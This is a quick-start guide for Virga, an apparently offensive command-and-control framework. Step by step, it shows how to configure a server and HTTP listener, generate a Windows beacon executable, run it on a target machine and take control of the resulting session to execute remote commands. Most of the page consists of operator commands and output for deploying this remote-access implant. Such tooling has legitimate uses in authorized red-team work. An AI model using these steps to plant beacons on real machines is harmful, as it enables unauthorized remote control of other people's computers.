# Quick Start

This guide provides a step-by-step tutorial to get your first beacon up and running.

## Step 1: Create Server Configuration

Create a configuration file named `config.yaml`. You can start with this minimal configuration:

```yaml
# config.yaml
server:
  host: "0.0.0.0"
  admin_port: 8443

database:
  path: "data/virga.db"

listeners:
  - name: "default-http"
    type: "http"
    bind_address: "0.0.0.0"
    port: 8080
    uri_path: "api/updates"
    encryption:
      type: "aes-256"
      key: "change-this-key-in-production-environment"
```

> **⚠️ Security Warning:** You **MUST** change the default `encryption.key` for any real deployment. See the [Security Guide](/guide/security) for more details.

Change server.host to your public IP address or domain name.

```bash
make update-ip
```
This will update the server.host, listeners.bind_address in the config.yaml and beacon.c2.host in the beacon.yaml file to your public IP address or domain name.

<NuAsciinemaPlayer
  src="../asciinema/guide/quick-start/update-ip.cast"
  :preload="true"
  :cols="95"
  :rows="20"
  :auto-play="false"
  :controls="true"
  :terminal-font-size="'12px'"
  :loop="false"
/>


## Step 2: Start the Server

Launch the server with the configuration file:

```bash
make run-server
```

## Step 3: Connect with the CLI

Before running the CLI, you can adjust the log level to control the verbosity of output. To do this, edit the `Makefile` and modify the `CLI_ARGS` variable:

```Makefile
# Choose your preferred log level:
# - info: Standard logging for production use (default)
# - debug: Verbose output for troubleshooting and development
# - off: Disable logging for quiet operation
CLI_ARGS ?= --log-level info
```

After configuring the log level, connect to the server's admin interface in a new terminal:

```bash
make run-cli
```

<NuAsciinemaPlayer
  src="../asciinema/guide/quick-start/run-cli.cast"
  :preload="true"
  :cols="95"
  :rows="20"
  :auto-play="false"
  :controls="true"
  :terminal-font-size="'12px'"
  :loop="false"
/>
You will be greeted by the `virga>` prompt in interactive mode.

## Step 4: Generate Your First Beacon

From the CLI, use the `generate` command to create a beacon. This example creates a beacon for Windows that connects to your local HTTP listener.

```bash
virga> generate beacon --os windows --arch amd64 --http localhost --port 8080 --output beacon.exe
```

<NuAsciinemaPlayer
  src="../asciinema/guide/quick-start/generatebeacon.cast"
  :preload="true"
  :cols="95"
  :rows="20"
  :auto-play="false"
  :controls="true"
  :terminal-font-size="'12px'"
  :loop="false"
/>

## Step 5: Deploy and Test

1.  Transfer the generated `beacon.exe` to a test machine.
2.  Execute it.
3.  Back in the Virga CLI, check for the new session using `sessions list`.

```bash
virga> sessions list
ID                                   IP              Hostname        Last Seen
--------------------------------------------------------------------------------
a1b2c3d4-e5f6-7890-abcd-ef1234567890 192.168.1.10    TEST-PC         ...
```

<NuAsciinemaPlayer
  src="../asciinema/guide/quick-start/sessionslist.cast"
  :preload="true"
  :cols="95"
  :rows="20"
  :auto-play="false"
  :controls="true"
  :terminal-font-size="'12px'"
  :loop="false"
/>

## Step 6: Interact with the Session

Use the `interact` command with the session ID to take control.

```bash
virga> interact a1b2c3d4-e5f6-7890-abcd-ef1234567890
[*] Now interacting with session a1b2c3d4-e5f6-7890-abcd-ef1234567890 (TEST-PC)

virga (a1b2c3d4)> exec whoami
[*] Executing command: whoami
test-pc\user
```

<NuAsciinemaPlayer
  src="../asciinema/guide/quick-start/interact.cast"
  :preload="true"
  :cols="95"
  :rows="30"
  :auto-play="false"
  :controls="true"
  :terminal-font-size="'12px'"
  :loop="false"
/>

To exit the interaction context, type `background` or `bg`.

## What's Next?

Congratulations on deploying your first beacon! Now you can explore more advanced topics:

- Learn about [Beacon Generation](/usage/beacon-generation) in more detail.
- Discover the [AI Features](/usage/ai-features).
- Consult the [CLI Command Reference](/reference/cli-command-reference) for a full list of commands.